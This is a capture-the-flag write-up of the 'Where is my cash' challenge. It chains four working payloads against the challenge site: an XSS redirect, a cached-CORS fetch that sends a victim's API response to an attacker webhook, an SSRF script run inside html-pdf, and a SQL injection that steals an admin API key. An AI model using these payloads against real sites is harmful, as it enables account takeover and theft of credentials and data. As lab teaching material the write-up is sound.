# Where is my cash - 2 Solves

## Description

We got first blood on this challenge. I'll just write about solution steps.

## Part 1 - XSS

There was XSS in `api_key` parameter in homepage, Our input would directly goes to javascript variable.

`const API_TOKEN = "INPUT";`

So we could redirect admin to our controlled website with following payload.

`?api_key="-(document.location='ourwebsite')-"`

## Part 2 - Misconfigured CORS

There was option in website that would let us to provide link from challenge's website and admin would visit it.

the `Access-Control-Allow-Origin` was set to `*` for `/1.0/user` endpoint and the `api_key` had to be set in `x-api-token` header.

Also there was no `cache-control` or `max-age` header. So the response would be cached and we could request the cached response from any origin. we can request from cache with fetch, Just need to set `cache` option to `force-cache`. 

To achieve this, We used the following code.

`fetch("https://api.wimc.ctf.allesctf.net/1.0/user",{"cache":"force-cache"}).then((r)=>r.text()).then((r)=>fetch("webhook?a="+btoa(r)));`  

which led to

`{"code":200,"data":{"wallets":[],"user_id":"13371337-1337-1337-1337-133713371335","api_key":"980a0deeeaa5261687fb6ad2e37561","username":"local_it_staff"},"status":"success"}`

So `local_it_staff`'s `api_key` is `980a0deeeaa5261687fb6ad2e37561`


## Part 3 - ssrf in html-pdf

Also there was html to pdf functionality in website which was using [html-pdf](https://www.npmjs.com/package/html-pdf) module. 

We could give any html to the `/1.0/admin/createReport` endpoint with `html` parameter, and it would give us the pdf of our html.

we could request to api with `XMLHttpRequest`. The api was running on port `1337` so we could request to api with following html 

```
<html>
<head>
</head>
<body>
<script>
    function reqListener (){
        document.write(this.responseText);
    } 
    var oReq = new XMLHttpRequest();
    oReq.addEventListener("load", reqListener); 
    oReq.open("GET", "http://127.0.0.1:1337/");
    oReq.send("");
</script>
</body>
</html>
```
Which result to `Cannot GET /` in created pdf.

## Part 4 - Steal admin api-key with SQLI
There was `/internal/createTestWallet` endpoint which would let us to create wallet, but the query was vulnerable to SQL Injection. The query was: 

`INSERT INTO wallets VALUES ('${wallet_id}', NULL, ${balance}, 'TESTING WALLET 1234');` 

And we could control the `balance` variable. 
<br>We knew that the flag holder was `bob_h4x0r` with user_id `13371337-1337-1337-1337-133713371337`.<br>So we created another wallet with our `user_id` as owner and `bob_h4x0r`'s apikey as `wallet_note`.

We could achieve this by providing following payload as `balance`.

 `0,""),(2122424354,"OUR USERID",1333,(select api_key from general where username="bob_h4x0r" )); -- -`

After executing the query, we could see new wallet with admin's apikey as note. After logging in with admin's apikey, we got the FLAG.

>FLAG :ALLES{th4nks f0r y0uR h31p, my fr13nd!}

Thanks to my amazing teammates and event's authors.